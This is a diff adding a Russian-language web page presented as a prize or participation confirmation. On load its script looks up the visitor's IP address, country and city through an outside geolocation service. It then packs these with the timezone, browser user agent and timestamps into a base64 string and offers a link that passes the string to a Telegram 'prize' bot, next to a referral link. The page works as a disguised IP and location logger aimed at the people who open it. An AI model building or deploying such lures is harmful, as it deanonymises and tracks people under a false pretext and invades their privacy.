@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Подтверждение участия</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body>
+<h2>Проверяем данные...</h2>
+<p id="status">Ожидаем информацию…</p>
+
+<script>
+// Получение UID из ссылки
+const url = new URL(window.location.href);
+const uid = url.searchParams.get("uid") || "unknown";
+
+// Функция для сбора отпечатка устройства
+function getDeviceInfo() {
+    return navigator.userAgent;
+}
+
+// Собираем время (UTC + локальное)
+const timestamp_utc = new Date().toISOString();
+const timestamp_local = new Date().toLocaleString();
+
+// Получаем IP/геолокацию
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => {
+    const packet = {
+      uid: uid,
+      ip: data.ip,
+      country: data.country_name,
+      city: data.city,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      device: getDeviceInfo(),
+      time_local: timestamp_local,
+      time_utc: timestamp_utc
+    };
+
+    const encoded = btoa(JSON.stringify(packet)); // шифруем в base64
+
+    document.getElementById("status").innerText = 
+      "Данные собраны. Нажмите кнопку ниже, чтобы отправить их боту.";
+
+    // Создаем ссылку на Telegram бота
+    const botLink = document.createElement("a");
+    botLink.href = `https://t.me/Check_prizebot?start=${encoded}`;
+    botLink.innerText = "Отправить данные боту";
+    botLink.style = "display:block;margin-top:20px;font-size:20px";
+
+    document.body.appendChild(botLink);
+
+    // Кнопка перехода по реферальной ссылке
+    const refLink = document.createElement("a");
+    refLink.href = "https://pplx.ai/gingel"; // твоя реальная реф. ссылка
+    refLink.innerText = "Перейти по реферальной ссылке →";
+    refLink.style = "display:block;margin-top:15px;font-size:18px";
+
+    document.body.appendChild(refLink);
+  });
+</script>
+
+</body>
+</html>
